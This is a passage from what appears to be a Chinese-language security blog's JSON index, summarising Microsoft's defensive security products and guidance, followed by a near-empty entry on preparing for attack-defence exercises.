应用程序，以简化管理和安全性。\n\n\n\nDevSecOps / 应用程序安全 / GitHubMicrosoft 使用我们的安全开发生命周期 (SDL) 来开发软件，并使用我们的运营安全保障 (OSA) 框架来运营云服务。 为了帮助客户安全应用，我们还提供\n•    SDL 和OSA 文档——帮助保护您的应用程序和操作。•    GitHub Advanced Security 提供DevSecOps 和应用程序开发安全，它在开发人员工作流程中本地集成，包括代码扫描、秘密扫描、警报、依赖项审查、安全策略等。\n\n特权访问Microsoft 提供有关保护特权访问 (SPA) 的说明性指南，以帮助您快速防御这些攻击技术（攻击者经常使用的高影响攻击向量）。 这是基于 Microsoft 用于保护我们的 IT 和云服务环境（内部称为安全访问工作站或 SAW）中的特权访问的方法\n本指南包括用于保护帐户、设备、中介和接口（包括使用特权访问工作站 - PAW）的策略、规划和实施文档。 该方法基于零信任原则，并利用条件访问来执行策略。\n\n信息保护/数据保护Microsoft 信息保护和 Azure Purview 提供了一个完整的生命周期方法来发现、分类、保护和监视您的组织依赖的数据，以推动任务完成和竞争优势（以各种形式、格式和位置）几个关键的重点领域是：\n•    无论数据存储在何处或与谁共享，都可以保护文件（相对于仅在特定设备/位置上保护文件）•     用于发现和评估 SharePoint 网站和文件共享中的现有数据的文件扫描程序•     数据治理提供整个信息生命周期的可见性和管理•     先进的电子发现功能，有助于简化履行这些法律义务•     检测 Amazon S3 存储桶扫描的开放权限（在 MDCA 中） - https://docs.microsoft.com/cloud-app-security/connect-aws-to-microsoft-cloud-app-security\n合规管理器 - 帮助您管理合规要求（主要基于管理我们的云服务对多个标准的合规性的经验教训）\n\n安全分数和合规分数安全分数 - 组织需要广泛了解其整个资产的风险和安全状况。 Microsoft 已投资帮助组织了解主要风险、确定优先级并减轻风险。合规分数——提供关于合规状况的类似见解以及您可以采取哪些措施来改进它\n\n人员安全如果没有保护和教育人们 + 防范内部风险（包括无意的和蓄意的恶意），安全程序是不完整的。 Microsoft 通过以下方式投资这些领域：\n•    攻击模拟器- 可用于在您的组织中运行真实的攻击场景，以帮助您识别和查找易受攻击的用户，通过 Terranova 安全提供微培训，帮助他们掌握安全知识。•    内部风险管理- Microsoft 365 中的内部风险使您能够检测、调查和处理组织中的恶意和无意活动，从而帮助最大限度地降低内部风险。•     通信合规性- 通过帮助您检测、捕获和处理组织中的不适当消息来帮助最小化通信风险。\n\n除了上述这些，微软还进行了大量其他安全投资，例如安全策略顾问 (https://docs.microsoft.com/DeployOffice/overview-of-security-policy-advisor) 和 Windows 服务器安全功能 ( https://docs.microsoft.com/windows-server/security/security-and-assurance）。\n","categories":["安全架构"],"tags":["安全建设","网络安全架构体系参考"]},{"title":"面向实战的基础安全体系升级&HW准备","url":"/%E9%9D%A2%E5%90%91%E5%AE%9E%E6%88%98%E7%9A%84%E5%9F%BA%E7%A1%80%E5%AE%89%E5%85%A8%E4%BD%93%E7%B3%BB%E5%8D%87%E7%BA%A7&HW%E5%87%86%E5%A4%87/","content":"时隔一年多，在2023年初放出来，和过去说声再见，新的一年，是时候向新的大海航行了\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n","categories":["应用安全"],"tags":["THINK"]}]